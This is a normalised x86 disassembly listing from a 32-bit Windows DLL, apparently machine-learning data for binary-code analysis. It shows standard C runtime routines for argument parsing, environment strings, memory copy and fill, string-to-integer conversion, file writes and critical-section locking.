inc ebp
cmp [ edi ] 0x3d
je r-xdata
pop ebp
push edi
push [ esi ]
call sub_10008730
pop ecx
add esi 0x4
pop ecx
push 0x9
call sub_10004776
pop ecx
sub_1000741f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov esi rw-data
push 0x104
push esi
push ebx
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
mov edi esi
cmp [ eax ] bl
je r-xdata
call sub_10008bf8
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push edi
call sub_100074b8
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 ]
push eax
call sub_100047df
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push edi
call sub_100074b8
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
leave
retn
push 0x8
call sub_10004776
pop ecx
sub_100074b8
push ebp
mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_1000766c
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_100047df
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_100047df
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_10005ed0
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_1000440b
pop ecx
mov [ esp + 0x10 ] ebx
sub_1000779e
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_100077d7
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_100077d7
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100077d7
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jb r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_100083c0
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_100083c0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_10008730
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_10008730
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_10008740
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_10008740
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_10008740
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_10008c14
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_100083c0
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_10003fd0
add esp 0x10
sub_10007930
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10007990 ]
jmp [ ecx * 4 + jump_table_10007a0c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007a78 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10007a78 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_10007c10 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10007b18 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007c10 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007a78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007a78 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10007a78 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10007c10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007c10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007c10 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_10007c10 ]
sub_10007c70
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_10007cdf
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rw-data ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_10008dd8
pop ecx
pop ecx
jmp r-xdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x14 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jl r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
push 0x10
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_10008dd8
pop ecx
pop ecx
jmp r-xdata
mov al [ esi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
test eax eax
je r-xdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
mov eax [ rw-data ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_10008dd8
pop ecx
pop ecx
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
test al 0x8
jne r-xdata
movsx eax bl
push eax
call sub_10008c9d
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je r-xdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
test ebx ebx
je r-xdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne r-xdata
call sub_1000644b
test [ ebp + 0x14 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x1
movzx esi bl
jle r-xdata
or [ ebp + 0x14 ] 0x4
jmp r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe r-xdata
mov eax [ ebp + 0x14 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x8 ] eax
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
test ebx ebx
je r-xdata
and eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x80000000
ja r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] esi
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10007ef0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_10007f28
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000644b
mov [ eax ] 0x9
call sub_10006454
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_10008f0e
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_10007f8d
push esi
mov edi eax
call sub_10008f6d
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_10007f8d
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_10008ecc
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_1000644b
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_100063d8
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_10008000
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000644b
mov [ eax ] 0x9
call sub_10006454
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_10008f0e
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_10008065
push esi
mov edi eax
call sub_10008f6d
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_10008065
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp + 0x8 ]
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ ebx ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
add eax esi
test [ eax + 0x4 ] 0x80
je r-xdata
push 0x2
push edi
push [ ebp + 0x8 ]
call sub_10007f8d
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0xc ]
push edi
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x10 ] edi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] edi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x40
je r-xdata
lea eax [ ebp - 0x414 ]
mov eax [ ebp - 0x8 ]
cmp eax edi
jne r-xdata
call sub_1000644b
mov [ eax ] 0x1c
call sub_10006454
mov [ eax ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x1a
je r-xdata
mov edi eax
lea eax [ ebp - 0x414 ]
sub edi eax
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x414 ]
push edi
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov cl [ ecx ]
cmp cl 0xa
jne r-xdata
sub eax [ ebp - 0x10 ]
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
cmp eax edi
jl r-xdata
mov [ eax ] cl
inc eax
mov ecx eax
lea edx [ ebp - 0x414 ]
sub ecx edx
cmp ecx 0x400
jl r-xdata
inc [ ebp - 0x10 ]
mov [ eax ] 0xd
inc eax
push 0x5
pop esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
xor edi edi
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp + 0x8 ]
call sub_100063d8
pop ecx
call sub_1000644b
mov [ eax ] 0x9
call sub_10006454
mov [ eax ] esi
jmp r-xdata
sub_100081f0
inc [ rw-data ]
push 0x1000
call sub_100047df
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_10008234
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_1000825d
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_100085e5
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_100085e5
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_10004776
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_10008319
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_10005bc2
pop ecx
retn
sub_10008348
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_10005bc2
pop ecx
retn
sub_1000836b
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_10005c23
pop ecx
retn
sub_1000839a
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_10005c23
pop ecx
retn
sub_100083c0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1000843b
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10008494
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_10005bc2
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_10005c23
